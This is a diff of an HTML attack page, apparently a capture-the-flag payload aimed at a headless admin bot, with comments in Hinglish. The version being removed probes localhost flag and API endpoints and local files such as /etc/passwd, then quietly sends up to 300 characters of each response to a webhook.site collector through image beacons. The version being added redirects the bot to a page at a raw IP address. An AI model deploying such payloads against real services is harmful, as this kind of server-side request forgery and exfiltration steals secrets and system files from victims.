@@ -4,39 +4,8 @@
 <script>
 var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
 
-// Bot server pe hai - localhost fetch karo
-var targets = [
-  'http://localhost:18920/flag',
-  'http://127.0.0.1:18920/flag',
-  'http://localhost:18920/api/flag',
-  'http://127.0.0.1:18920/api/flag',
-  'http://localhost:18920/api/secret',
-  'http://localhost:18920/api/admin',
-  'http://localhost:18920/api/bot-profile',
-  'http://localhost:18920/api/llm-profile',
-  'http://localhost:3000/flag',
-  'http://localhost:5000/flag',
-  'http://localhost:8080/flag',
-  'file:///flag',
-  'file:///etc/passwd',
-  'file:///flag.txt',
-  'file:///app/flag',
-  'file:///app/flag.txt'
-];
-
-targets.forEach(function(url) {
-  fetch(url)
-    .then(function(r) { 
-      return r.text(); 
-    })
-    .then(function(d) {
-      // Data mila!
-      new Image().src = w + '?url=' + encodeURIComponent(url) + '&data=' + encodeURIComponent(d.substring(0,300));
-    })
-    .catch(function(e) {
-      // Silently fail
-    });
-});
+// Bot ko drawing page pe redirect karo
+window.location = 'http://151.115.166.43:18920/drawing/f0376f61f2544bcc';
 </script>
 </body>
 </html>
